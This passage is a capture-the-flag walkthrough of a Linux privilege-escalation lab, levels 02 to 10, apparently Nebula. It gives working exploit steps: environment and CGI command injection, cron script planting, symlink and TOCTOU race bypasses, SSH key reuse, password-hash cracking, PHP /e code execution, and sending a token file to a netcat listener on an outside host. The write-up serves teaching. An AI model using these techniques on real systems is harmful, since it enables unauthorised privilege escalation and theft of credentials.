    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s2">" &amp;&amp; /bin/bash &amp;&amp; echo"</span>
</code></pre></div>    </div>
  </li>
  <li>
    <p>The permissions of the flag02 program has the SUID set, therefore whatever will be invoked by the program will have the permission of the owner, resulting in escalated permissions for us. We run flag02, and impersonating the new user we run the <code class="language-plaintext highlighter-rouge">getflag</code> command, which results in successfully getting the flag.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./flag02 <span class="c"># remember to execute from the correct folder</span>
 getflag
</code></pre></div>    </div>
  </li>
</ol>

<h3 id="level-03">[Level 03]</h3>
<p>There are files in /home/flag03, and a crontab called every couple of minutes.</p>

<blockquote>
  <p>Crontab: with this command it is possible to plan the automatic periodic execution of other commands. To do this, a daemon is constantly running in the background and checking (once per minute) the registered command. If the commands reached their timeout, they will be executed and the timeout reset.</p>

  <p>The command has the following structure:
   <code class="language-plaintext highlighter-rouge">m h d M w command</code>
The mhdMw fields specify when and how often a command should be executed:</p>

  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   m: minute (0 - 59)
   h: hour (0 - 23)
   d: day of the month (1 - 31)
   M: month (1 - 12)
   w: day of the week (0 - 6, Sunday = 0)
</code></pre></div>  </div>

  <p>Each field can contain more than a value: a list can be given using a comma <code class="language-plaintext highlighter-rouge">,</code>, an interval using a dash <code class="language-plaintext highlighter-rouge">-</code>. The star <code class="language-plaintext highlighter-rouge">*</code> means every value possible for that field. Whenever the values are true, the command will be executed.</p>
</blockquote>

<ol>
  <li>We look at the files in the /home/flag03 folder. There is an empty subfolder and a shell script that when called will run all scripts that are stored in the currently empty folder with the command <code class="language-plaintext highlighter-rouge">ulimit -t 5; bash -x "$i"</code>, and then delete the finished script with <code class="language-plaintext highlighter-rouge">rm -f "$i"</code>.</li>
  <li>
    <p>To check if the crontab will give the SUID permissions to the scripts in the target folder, we can create a script that will return different values depending on the running permissions. This is what we want to echo in our output file:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
 <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0]
     <span class="k">then </span><span class="nb">echo</span> <span class="s2">"Please root me!"</span>
     <span class="k">else </span><span class="nb">echo</span> <span class="s2">"I am GROOT!"</span>
     <span class="nb">exit
 </span><span class="k">fi</span>
 <span class="o">&gt;&gt;</span> /tmp/root
</code></pre></div>    </div>
  </li>
  <li>After the cronjob run, we can check the result in <code class="language-plaintext highlighter-rouge">/tmp/root</code>. The result will depend on the effective user running the script, corresponding to <code class="language-plaintext highlighter-rouge">$EUID</code>. If <code class="language-plaintext highlighter-rouge">$EUID</code> is root, its value will be 0, therefore our file will contain “I am GROOT!”. This is indeed what is in our output file, and with this we know that the scripts are really run with SUID.</li>
  <li>We know our script will run with elevated permissions. Therefore we want to call our getflag command from there. First of all we need to know where that command is, using <code class="language-plaintext highlighter-rouge">whereis getflag</code></li>
  <li>
    <p>We create the script: it will call the getflag command and store the output in a file, as a proof that we got the flag.</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n/bin/getflag &gt;&gt; /tmp/flag'</span> <span class="o">&gt;</span> script.sh
</code></pre></div>    </div>
  </li>
  <li>Now we have to wait for the crontab to execute the writable.sh script, which in turn will execute our own script. After the needed time, we can look in our output file for the flag: <code class="language-plaintext highlighter-rouge">cat /tmp/flag</code></li>
</ol>

<h3 id="level-04">[Level 04]</h3>
<p>Read the token file bypassing the restrictions in the code.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s [file to read]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"token"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"You may not access '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to open %s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="p">}</span>

    <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    
    <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to read fd %d"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>char *strstr(const char *str1, const char *str2): the function returns a pointer to the first occurrence of str2 in str1, or a null pointer if str2 is not part of str1. The matching process does not include the terminating null-characters, but it stops there.</p>
</blockquote>

<blockquote>
  <p>Symlink: this file is not just a shortcut pointing to another file, but is a low level pointer written into the file system. This means that it looks like the pointed file is actually there, even if after clicking you will be redirected. The default permissions for a symbolic link are 777, as if it were a folder.</p>
</blockquote>

<ol>
  <li>The code takes a parameter containing the path to the file to read, and if the path contains the string “token” it will block us. The file itself has no reading permissions, so we can’t go around it using cat or tail. Also, the <code class="language-plaintext highlighter-rouge">strstr()</code>` method doesn’t seem to have any vulnerability.</li>
  <li>We have to find a way to change the name of the file, and symlinks give us the right opportunity. We can create the link with a different name in a different path where we have rw permissions
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">ln</span> <span class="nt">-s</span> /home/flag04/token /tmp/readme
</code></pre></div>    </div>
  </li>
  <li>Now we can let the flag04 program run on our new link, and as there is no “token” in the new path we will not be blocked. The result is an alphanumerical string</li>
  <li>The string doesn’t look like ASCII, nor like Base64. We try to use it as password to gain access to a user with higher privileges, in this case flag04: <code class="language-plaintext highlighter-rouge">su -l flag04</code></li>
  <li>We are now logged in as flag04 and can execute the <code class="language-plaintext highlighter-rouge">getflag</code> command</li>
</ol>

<h3 id="level-05">[Level 05]</h3>
<p>Find interesting files in the flag05 folder.</p>

<blockquote>
  <p>tar: archiving utility, often combined explicitly with compressions like gzip (.tar.gz) or bzip (.tar.bz). To extract an archive in a target folder use tar -xf source.tar -C folder, or tar xzf source.tar.gz if compressed with gzip. To list the contents of a tar file use tar tvf source.tar</p>
</blockquote>

<ol>
  <li>We can list the content of the flag05 folder with the <code class="language-plaintext highlighter-rouge">ls -R</code> command. What we find is a tar archive in the backup folder.</li>
  <li>We look at what is in that archive, using tar <code class="language-plaintext highlighter-rouge">tvf backup-19072011.tgz</code>. It seems that it contains ssh keys and authorized keys.</li>
  <li>
    <p>We want to decompress the archive, but the backup folder doesn’t have write permissions. So we use the <code class="language-plaintext highlighter-rouge">/tmp</code> folder as output path</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">tar</span> <span class="nt">-xf</span> backup-19072011.tgz <span class="nt">-C</span> /tmp/
</code></pre></div>    </div>
  </li>
  <li>
    <p>We assume that the key is the one used to ssh into the VM with higher privileges, like with the user flag05, without needing a password. Therefore we use ssh to connect to 127.0.0.1 (which corresponds to localhost) passing the key with parameter -i</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ssh <span class="nt">-i</span> /tmp/.ssh/id_rsa flag05@127.0.0.1
</code></pre></div>    </div>
  </li>
  <li>We are now in the VM with higher privileges, and can execute getflag</li>
</ol>

<h3 id="level-06">[Level 06]</h3>
<p>The flag06 account credentials came from a legacy unix system.</p>

<blockquote>
  <p>/etc/passwd: this text file stores login information about each user in the system. There is one line for each user, and each entry is made by seven values separated by columns.</p>

  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   Username: used when user logs in.
   Password: an x character indicates that encrypted password is stored in /etc/shadow file.
   User ID: UID 0 is reserved for root; UIDs 1-99 are reserved for other predefined accounts; UID 100-999 are reserved by system for administrative and system accounts/groups.
   Group ID: the primary group ID (stored in /etc/group file)
   User ID Info: comment field.
   Home directory: absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
   Command/shell: The absolute path of a command or shell (tipically /bin/bash).
</code></pre></div>  </div>

  <p>In old operating systems the password was stored directly in this file. Nowadays it is not anymore</p>
</blockquote>

<blockquote>
  <p>/etc/shadow: a text file where actual passwords (and additional informations) are stored in encrypted format. As in /etc/passwd, there is one entry per each user, one per line.</p>

  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   Username : login name.
   Password : encrypted password. Usual format is $id$salt$hashed, where the $id is the algorithm used On GNU/Linux as follows:
       $1$ is MD5
       $2a$ is Blowfish
       $2y$ is Blowfish
       $5$ is SHA-256
       $6$ is SHA-512
   Lastchanged: days since Jan 1, 1970 that password was last changed
   Minimum : the number of days left before the user is allowed to change password
   Maximum : the maximum number of days the password is valid, after that user is forced to change password
   Warn : the number of days before password is to expire that user is warned to change password
   Inactive : the number of days after password expires that account is disabled
   Expire : days since Jan 1, 1970 that account is disabled
</code></pre></div>  </div>
</blockquote>

<ol>
  <li>The mention of an old systems clearly hints at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. We can take a look at it with the following command (we use <code class="language-plaintext highlighter-rouge">grep</code> to just get the infos about a the specific account): <code class="language-plaintext highlighter-rouge">grep flag06 /etc/passwd</code></li>
  <li>We get a line that looks like it contains the password. However, trying <code class="language-plaintext highlighter-rouge">su -u flag06</code> with it will not work.</li>
  <li>The reason it does not work is that the password is encrypted. To decrypt it we can use an utility like John the Ripper. In this case the usage is really simple, as it is enough to save the string “flag06:ueqwOCnSGdsuM” to a file and pass the path to that file to john.</li>
  <li>John answers almost immediately, giving the password that can now be used for the <code class="language-plaintext highlighter-rouge">su</code> command to become user flag06 and execute <code class="language-plaintext highlighter-rouge">getflag</code></li>
</ol>

<h3 id="level-07">[Level 07]</h3>
<p>Perl program allowing to ping to check for reachability from a webserver.</p>

<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/perl</span>
<span class="k">use</span> <span class="nv">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>

<span class="k">print</span> <span class="p">"</span><span class="s2">Content-type: text/html</span><span class="se">\n\n</span><span class="p">";</span>

<span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
    <span class="nv">$host</span> <span class="o">=</span> <span class="vg">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>

    <span class="k">print</span><span class="p">("</span><span class="s2">Ping results</span><span class="p">");</span>

    <span class="nv">@output</span> <span class="o">=</span> <span class="p">`</span><span class="sb">ping -c 3 </span><span class="si">$host</span><span class="sb"> 2&gt;&amp;1</span><span class="p">`;</span>
    <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span> <span class="k">print</span> <span class="p">"</span><span class="si">$line</span><span class="p">";</span> <span class="p">}</span>
<span class="p">}</span>

<span class="c1"># check if Host set. if not, display normal page, etc</span>
<span class="nv">ping</span><span class="p">(</span><span class="nv">param</span><span class="p">("</span><span class="s2">Host</span><span class="p">"));</span>
</code></pre></div></div>

<ol>
  <li>Even without knowing Perl, it is clear that there is a possibility to inject stuff where the <code class="language-plaintext highlighter-rouge">ping</code> command is created by modifying the <code class="language-plaintext highlighter-rouge">$host</code> parameter. Also, the challenge description says that the file is served through a webserver, and in the flag07 folder we find a <code class="language-plaintext highlighter-rouge">thttpd.conf</code> file indicating that the used port is 7007 (just grep for “port” on that file). The file can be executed also locally with <code class="language-plaintext highlighter-rouge">./index.cgi Host=127.0.0.1</code></li>
  <li>We can inject commands by appending them after the IP to ping (or also by omitting the IP): <code class="language-plaintext highlighter-rouge">./index.cgi Host=; ls -asl</code>. However, injecting directly <code class="language-plaintext highlighter-rouge">getflag</code> doesn’t work because the permission is still for the current user.</li>
  <li>What we can assume is that only if we send the command through the server it will run with the proper permissions to retrieve our flag. We could do that using wget, which just needs the address as parameter. We want to pass the Host as a GET parameter in the URL (remember URL encoding), so this is our command: <code class="language-plaintext highlighter-rouge">wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag</code>.</li>
  <li>Note that you could do this also from the browser of your host, just remember to put the proper IP in the address.</li>
</ol>

<h3 id="level-08">[Level 08]</h3>
<p>World readable files strike again. Check what that user was up to, and use it to log into flag08 account.</p>

<ol>
  <li>In the flag08 folder we see there is a pcap file. That’s a file format used to store network captures, and it can be opened using WireShark.</li>
  <li>The first thing we do is copy the file to a local folder in our host system, executing from the host <code class="language-plaintext highlighter-rouge">scp level08@[[the VM IP address]]:/home/flag08/capture.pcap flag08.pcap .</code></li>
  <li>Opening the file with WireShark we can see that there are only two machines communicating, and by right-clicking on a packet we can follow the TCP stream. Within this stream we see a line saying <code class="language-plaintext highlighter-rouge">Password: backdoor...00Rm8.ate</code>.</li>
  <li>The dots that are part of the password looks odd, so we switch to hex view. With this view we can see that the dots correspond to hex values 0x7F, which in ASCII translates to backspace. This means that the user wrote “backdoor”, deleted the last three characters, then wrote “00Rm8”, deleted the last character and wrote “ate”.</li>
  <li>Following the typing and deleting, we can reconstruct the password that allows us to log in t as flag08 and run <code class="language-plaintext highlighter-rouge">getflag</code></li>
</ol>

<h3 id="level-09">[Level 09]</h3>
<p>C setuid wrapper for vulnerable PHP code.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">function</span> <span class="nf">spam</span><span class="p">(</span><span class="err">$</span><span class="n">email</span><span class="p">){</span>
    <span class="err">$</span><span class="n">email</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/\./"</span><span class="p">,</span> <span class="s">" dot "</span><span class="p">,</span> <span class="err">$</span><span class="n">email</span><span class="p">);</span>
    <span class="err">$</span><span class="n">email</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/@/"</span><span class="p">,</span> <span class="s">" AT "</span><span class="p">,</span> <span class="err">$</span><span class="n">email</span><span class="p">);</span>
    
    <span class="k">return</span> <span class="err">$</span><span class="n">email</span><span class="p">;</span>
<span class="p">}</span>

<span class="n">function</span> <span class="nf">markup</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">,</span> <span class="err">$</span><span class="n">use_me</span><span class="p">){</span>
    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>

    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/(\[email (.*)\])/e"</span><span class="p">,</span> <span class="s">"spam(</span><span class="se">\"\\</span><span class="s">2</span><span class="se">\"</span><span class="s">)"</span><span class="p">,</span> <span class="err">$</span><span class="n">contents</span><span class="p">);</span>
    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/\[/"</span><span class="p">,</span> <span class="s">"&lt;"</span><span class="p">,</span> <span class="err">$</span><span class="n">contents</span><span class="p">);</span>
    <span class="err">$</span><span class="n">contents</span> <span class="o">=</span> <span class="n">preg_replace</span><span class="p">(</span><span class="s">"/\]/"</span><span class="p">,</span> <span class="s">"&gt;"</span><span class="p">,</span> <span class="err">$</span><span class="n">contents</span><span class="p">);</span>

    <span class="k">return</span> <span class="err">$</span><span class="n">contents</span><span class="p">;</span>
<span class="p">}</span>

<span class="err">$</span><span class="n">output</span> <span class="o">=</span> <span class="n">markup</span><span class="p">(</span><span class="err">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="err">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

<span class="n">print</span> <span class="err">$</span><span class="n">output</span><span class="p">;</span>
</code></pre></div></div>

<blockquote>
  <p>string file_get_contents(string $filename): reads entire file into a string, and returns the file in a string, starting at the specified offset up to maxlen bytes. On failure, it will return FALSE.</p>
</blockquote>

<blockquote>
  <p>mixed preg_replace(mixed $pattern, mixed $replacement, mixed $subject): performs a search&amp;replace based on a regular expression. When the pattern is matched, it is replaced. When the first parameter ends with “/e”, the second is evaluated as a PHP expression instead than like a simple regex.</p>
</blockquote>

<ol>
  <li>The <code class="language-plaintext highlighter-rouge">markup()</code> function reads the content of a file passed as first argument, and looks for strings of the form “[email name@domain.com]”. These strings are passed to the <code class="language-plaintext highlighter-rouge">spam()</code> method, that substitutes every “@” with “AT” and every “.” with “dot”.</li>
  <li>We have to find a way to inject a command rather than an email, and to make it execute. The PHP syntax has to be found with a bit of trial and error, but it turns out that something like <code class="language-plaintext highlighter-rouge">email {${phpinfo()}}]</code> will execute the <code class="language-plaintext highlighter-rouge">phpinfo</code> method properly when invoked with <code class="language-plaintext highlighter-rouge">./flag09 /tmp/email use_me</code>. Remember to save that into the <code class="language-plaintext highlighter-rouge">/tmp/email</code> file.</li>
  <li>We can’t pass directly <code class="language-plaintext highlighter-rouge">system("getflag"())</code> as email address, because all the quotes will be escaped. It is the right moment to improvise and pick the hint that is in the method declaration: we try to pass the second argument and see what happens. This time we set the file as <code class="language-plaintext highlighter-rouge">"[email $use_me]"</code>, so that it will be interpreted as variable. If we execute that, whatever we pass as second argument will be reflected to us.</li>
  <li>So what we want to do is pass the <code class="language-plaintext highlighter-rouge">system()</code> call as the <code class="language-plaintext highlighter-rouge">phpinfo</code> attempt so that it gets executed, and the argument to that will be our <code class="language-plaintext highlighter-rouge">$use_me</code> variable that we can set to be <code class="language-plaintext highlighter-rouge">getflag</code>: the mail file is <code class="language-plaintext highlighter-rouge">email {${system($use_me)}}]</code>, and the execution is <code class="language-plaintext highlighter-rouge">./flag09 /tmp/email getflag</code></li>
</ol>

<h3 id="level-10">[Level 10]</h3>
<p>The binary uploads any file, as long as it meets the requirements of the access() system call.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s file host</span><span class="se">\n\t</span><span class="s">sends file to host if you have access to it</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">file</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">host</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span><span class="n">access</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">R_OK</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">ffd</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">rc</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">sin</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">"Connecting to %s:18211 .. "</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

        <span class="n">fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">));</span>
        <span class="n">sin</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
        <span class="n">sin</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>
        <span class="n">sin</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">18211</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">sin</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to connect to host %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>

<span class="cp">#define HITHERE ".oO Oo.\n"
</span>        <span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">HITHERE</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">HITHERE</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to write banner to host %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>
<span class="cp">#undef HITHERE
</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"Connected!</span><span class="se">\n</span><span class="s">Sending file .. "</span><span class="p">);</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

        <span class="n">ffd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">ffd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Damn. Unable to open file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">ffd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to read from file: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"wrote file!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"You don't have access to %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">file</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>int access(const char *pathname, int mode): check real user’s permissions for a file, or whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced. The check uses the calling process’s real UID and GID, rather than the effective IDs. On success it returns 0, on error -1 is returned, and errno is set appropriately.</p>
</blockquote>

<blockquote>
  <p>TOCTOU bug: time of check to time of use is an example of race conditions caused by changes in a system between the checking of a condition (such as a security credential) and the use of the results of that check.</p>
</blockquote>

<blockquote>
  <p>Race condition: this is a class of bugs that might happen when the output of a certain function depends on the order or timing of other uncontrollable events. This kind of problem arise often in multithreaded programming.</p>
</blockquote>

<blockquote>
  <p>Netcat: invoked also with the simple command nc, Netcat is a networking tool for reading from and writing to connections using TCP or UDP. As in Level10, we can use it as a listener waiting for incoming connections.</p>
</blockquote>

<ol>
  <li>This program takes a file and sends it to a specified IP address. We can test this by opening a netcat listener in our host machine with <code class="language-plaintext highlighter-rouge">nc -l 18211</code> (the port is specified in the C code) and from the VM sending a file to it with <code class="language-plaintext highlighter-rouge">./flag10 /tmp/ncTest [IP of the host]</code>. In the host we will see a little header and the content of our test file.</li>
  <li>Similarly to Level04, we have to provide a file that passes the checks. However, it is not a check made on the name but on the actual permissions of a file. What is interesting to note is that while <code class="language-plaintext highlighter-rouge">access()</code> uses the real UID, <code class="language-plaintext highlighter-rouge">open()</code> still uses the effective UID, which in our case will contain SUID. This is a case of TOCTOU bug that we can exploit.</li>
  <li>
    <p>To exploit the bug we have to create a race condition. To do this we create a loop that constantly swaps the real file with a fake file using symlinks: by executing the flag10 program multiple times we hope that at some point we will be lucky and run it with the perfect timing so that the <code class="language-plaintext highlighter-rouge">access()</code> tests the real file and the <code class="language-plaintext highlighter-rouge">open()</code> gets the swapped file. We create the loop in a bash file:</p>

    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
 <span class="k">while </span><span class="nb">true
 </span><span class="k">do
     </span><span class="nb">ln</span> <span class="nt">-sf</span> /home/flag10/token /tmp/swaptok
     <span class="nb">ln</span> <span class="nt">-sf</span> /tmp/ncTest /tmp/swaptok
 <span class="k">done</span>
</code></pre></div>    </div>
  </li>
  <li>We run this file with ``./loop.sh &amp;<code class="language-plaintext highlighter-rouge">, where the &amp; is needed to put the job in the background so that we can run something else in the meantime. In our host we start netcat again, this time using the -k flag so that it will keep listening: </code>nc -lk 18211`.</li>
  <li>The last step is to run flag10 multiple times passing our symlink to it, until we manage to trigger the race condition. To do this, we use an inline loop (using a script form tmp folder would not work because we don’t have read access): <code class="language-plaintext highlighter-rouge">while true; do ./flag10 /tmp/swaptok [IP of the host]; done;</code></li>
